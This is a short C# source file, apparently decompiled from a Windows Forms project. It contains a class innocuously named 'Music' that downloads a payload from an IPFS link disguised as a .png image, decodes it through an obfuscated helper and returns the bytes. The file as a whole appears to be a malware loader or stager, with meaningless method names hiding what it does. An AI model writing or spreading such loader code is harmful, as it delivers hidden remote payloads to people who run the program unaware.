using System;
using System.IO;
using System.Net;
using System.Text;

namespace WindowsFormsApp52;

internal class Music
{
	internal static byte[] GetBuffer()
	{
		object obj = Samsung.Buffer(Abwdnkadqgtbunvuruwabwq("https://dweb.link/ipfs/QmYrgw1sLUB8REY4KtNwVjP4VSnwk1kBnJjRBcbAU4BTqV?filename=Ervxt_Kywwuwgd.png"));
		if (obj == null)
		{
			obj = null;
		}
		else if (obj != null)
		{
			return (byte[])obj;
		}
		throw new Exception();
	}

	private static string Abwdnkadqgtbunvuruwabwq(string s)
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		using StreamReader streamReader = new StreamReader(WebRequest.Create(s).GetResponse().GetResponseStream(), Encoding.UTF8);
		return streamReader.ReadToEnd();
	}
}
